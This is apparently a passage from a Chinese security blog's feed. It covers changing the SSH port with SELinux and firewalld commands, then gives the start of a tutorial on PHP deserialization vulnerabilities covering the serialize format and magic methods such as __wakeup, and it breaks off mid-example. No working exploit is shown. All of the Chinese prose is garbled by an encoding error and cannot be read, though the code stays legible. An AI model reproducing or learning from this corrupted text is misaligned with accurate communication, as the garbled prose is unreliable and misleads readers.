LC_TELEPHONE LC_MEASUREMENT<br>AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE<br>AcceptEnv XMODIFIERS<br><br><span class="hljs-meta"># override default of no subsystems</span><br>Subsystem       sftp    /usr/libexec/openssh/sftp-server<br><br><span class="hljs-meta"># Example of overriding settings on a per-user basis</span><br><span class="hljs-meta">#Match User anoncvs</span><br><span class="hljs-meta">#       X11Forwarding no</span><br><span class="hljs-meta">#       AllowTcpForwarding no</span><br><span class="hljs-meta">#       PermitTTY no</span><br><span class="hljs-meta">#       ForceCommand cvs server</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸€æ¬¡æ›´æ”¹é…ç½®æ–‡ä»¶éƒ½è¦é‡å¯æœåŠ¡æ‰èƒ½ç”Ÿæ•ˆ</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#é‡å¯systemctl restart sshd</span><br><span class="hljs-meta">#æŸ¥çœ‹systemctl status sshd</span><br><span class="hljs-meta">#åœæ­¢systemctl stop sshd</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–æ–¹æ³•æŸ¥çœ‹</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#è¿›ç¨‹ps -e|grep sshd</span><br><span class="hljs-meta">#ç½‘ç»œçŠ¶æ€netstat -an|grep 22888</span><br></code></pre></td></tr></table></figure><p>ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†ï¼Œnononoï¼Œè¿˜æœ‰ä¸¤å±‚å±‚è†œæ²¡æœ‰æ…ç ´</p><h2 id="äºŒã€å¼€æ”¾ç«¯å£"><a href="#äºŒã€å¼€æ”¾ç«¯å£" class="headerlink" title="äºŒã€å¼€æ”¾ç«¯å£"></a>äºŒã€å¼€æ”¾ç«¯å£</h2><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>å¦‚æœä½ å…³é—­äº†è¿™ä¸ªå®‰å…¨ç³»ç»Ÿï¼Œç›´æ¥è·³è‡³ firewall-cmd</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">semanage port -l|<span class="hljs-keyword">grep</span> ssh<span class="hljs-comment">#æ‰“å°SELinuxå¼€æ”¾sshçš„æƒ…å†µ</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/03/.png"></p><p>å¥½å§ å®ƒåªå¼€æ”¾äº† 22</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">semanage</span> port -a -t ssh_port_t -p tcp <span class="hljs-number">23333</span>#æ·»åŠ ç«¯å£<span class="hljs-number">23333</span><br></code></pre></td></tr></table></figure><p>å†æ¬¡æ‰“å°ï¼Œå·²ç»æ·»åŠ å®Œæ¯•</p><h3 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--query-port=23333/tcp</span><span class="hljs-comment">#æ‰“å°é˜²ç«å¢™æ˜¯å¦å¼€æ”¾äº†tcpçš„23333ç«¯å£</span><br></code></pre></td></tr></table></figure><p>è‚¯å®šæ²¡æœ‰</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--add-port=23333/tcp</span><span class="hljs-comment">#æ·»åŠ é˜²ç«å¢™è§„åˆ™</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="bash"> --reload<span class="hljs-comment">#é‡è½½é˜²ç«å¢™ç­–ç•¥</span></span><br></code></pre></td></tr></table></figure><p>ä½ ç™»å½•å§ ğŸ˜‚</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é€šä¿¡éš§é“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>ç±»ä¸­ï¼Œå®ä¾‹åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè€ŒæŠŠè¿™ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åºåˆ—åŒ–ã€‚åè¿‡æ¥ï¼Œå°†å­—ç¬¦ä¸²è½¬åŒ–æˆç±»æ¨¡æ¿å½¢å¼çš„å¯¹è±¡ï¼Œå°±æ˜¯ååºåˆ—åŒ–ã€‚ä¸¤è€…ç»“åˆå°±å¯ä»¥æ–¹ä¾¿åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚</p><p>ä¸åŒç¼–ç¨‹è¯­è¨€åºåˆ—åŒ–åçš„å­˜å‚¨æ–‡ä»¶ä¸åŒï¼Œå½“ç„¶è¯­æ³•ä¹Ÿä¸ç›¸åŒ</p><p>æˆ‘ä»¬ä»¥ php è¯­è¨€ä¸ºä¾‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png"></p><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">serialize()</td><td align="center">å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²å­—ç¬¦ä¸²</td></tr><tr><td align="center">unserialize()</td><td align="center">å°†ä¸€ä¸²å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡</td></tr></tbody></table><h2 id="PHP-åºåˆ—åŒ–çš„æ ¼å¼"><a href="#PHP-åºåˆ—åŒ–çš„æ ¼å¼" class="headerlink" title="PHP åºåˆ—åŒ–çš„æ ¼å¼"></a>PHP åºåˆ—åŒ–çš„æ ¼å¼</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//æœ€å¸¸ç”¨çš„å¤åˆç±»å‹<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h4 id="public-protected-private-åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"><a href="#public-protected-private-åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«" class="headerlink" title="public/protected/private åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"></a>public/protected/private åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«</h4><p>è¿™ä¸ªç±»çš„ä¸‰ä¸ªæˆå‘˜å˜é‡ç”±äºå˜é‡å‰çš„ä¿®é¥°ä¸åŒï¼Œåœ¨åºåˆ—åŒ–å‡ºæ¥åæ˜¾ç¤ºçš„ä¹Ÿä¸åŒã€‚</p><p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ï¼šä»¥ <code>;</code>åˆ†å¼€å˜é‡åå’Œå˜é‡å€¼ï¼Œå˜é‡åä¸º 1 ä¸ªå­—ç¬¦çš„ aï¼Œå˜é‡å€¼ä¸ºâ€ThisAâ€</p><p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>ï¼šå¤šäº† <code>*</code>ï¼Œç”¨ä»¥åŒºåˆ† protected ä¿®é¥°ç¬¦ï¼Œå¦å¤–å®é™…é¡µé¢ä¸­ä¼šå‡ºç°ä¹±ç ï¼Œå®é™…ä¸Š protected å±æ€§çš„è¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸ª<code>%00*%00</code></p><p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>ï¼š åœ¨å˜é‡åå‰åŠ ä¸Šäº†<code>%00ç±»å%00</code></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­å¹¶æ²¡æœ‰åŒ…å«è¿™ä¸ª test æ–¹æ³•çš„ä¿¡æ¯;ååºåˆ—åŒ–åï¼Œç±»çš„æˆå‘˜å˜é‡è¢«è¿˜åŸäº†ï¼Œä½†æ˜¯ç±»æ–¹æ³•æ²¡æœ‰è¢«è¿˜åŸã€‚</p><p>å› ä¸º<strong>åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•</strong></p><blockquote><p>â‘ private å±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šåœ¨ä¸¤ä¾§åŠ å…¥ç©ºå­—èŠ‚ï¼Œprivate å±æ€§åºåˆ—åŒ–æ—¶ä¼šåœ¨å˜é‡å‰é¢åŠ ä¸ŠåŠ ä¸Šç±»å</p><p>â‘¡ åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•</p></blockquote><h2 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a>å¸¸è§çš„é­”æœ¯æ–¹æ³•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//ç±»çš„æ„é€ å‡½æ•°</span><br><br>__destruct()<span class="hljs-comment">//ç±»çš„ææ„å‡½æ•°</span><br><br>__call()<span class="hljs-comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><br>__callStatic()<span class="hljs-comment">//ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><br>__get()<span class="hljs-comment">//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><br>__set()<span class="hljs-comment">//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><br>__isset()<span class="hljs-comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span><br><br>__unset()<span class="hljs-comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</span><br><br>__sleep()<span class="hljs-comment">//æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><br>__wakeup()<span class="hljs-comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><br>__toString()<span class="hljs-comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span><br><br>__invoke()<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><br>__set_state()<span class="hljs-comment">//è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><br>__clone()<span class="hljs-comment">//å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><br>__autoload()<span class="hljs-comment">//å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><br>__debugInfo()<span class="hljs-comment">//æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>åˆ›å»ºå¯¹è±¡æ—¶å°±ä¼šæ‰§è¡Œçš„æ„é€ å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//è¾“å‡ºï¼š__construct test</span><br></code></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br><br><span class="hljs-comment">//è¾“å‡ºï¼š__destruct test</span><br></code></pre></td></tr></table></figure><h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>å½“ä¸€ä¸ªç±»å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² å¦åˆ™äº§ç”Ÿ<strong>E_RECOVERABLE_ERROR</strong> çº§åˆ«çš„è‡´å‘½é”™è¯¯</p><p>æƒ…å½¢æœ‰</p><ul><li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p></li><li><p><input checked="" disabled="" type="checkbox">  å­—ç¬¦ä¸²è¿æ¥</p></li><li><p><input checked="" disabled="" type="checkbox">  æ ¼å¼åŒ–å­—ç¬¦ä¸²</p></li><li><p><input checked="" disabled="" type="checkbox">  å­—ç¬¦ä¸²==æ¯”è¾ƒï¼Œæ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹</p></li><li><p><input checked="" disabled="" type="checkbox">  æ ¼å¼åŒ– SQL è¯­å¥ï¼Œç»‘å®šå‚æ•°</p></li><li><p><input checked="" disabled="" type="checkbox">  æ•°ç»„ä¸­æœ‰å­—ç¬¦ä¸²</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//è¾“å‡ºï¼šhello</span><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª<strong>E_NOTICE</strong>çº§åˆ«çš„é”™è¯¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//è¾“å‡ºï¼šO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>å¯¹è±¡ååºåˆ—åŒ–æ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code>æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚å¦‚æœä¸å­˜åœ¨ï¼Œè¿”å› voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¾“å‡ºï¼š</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span 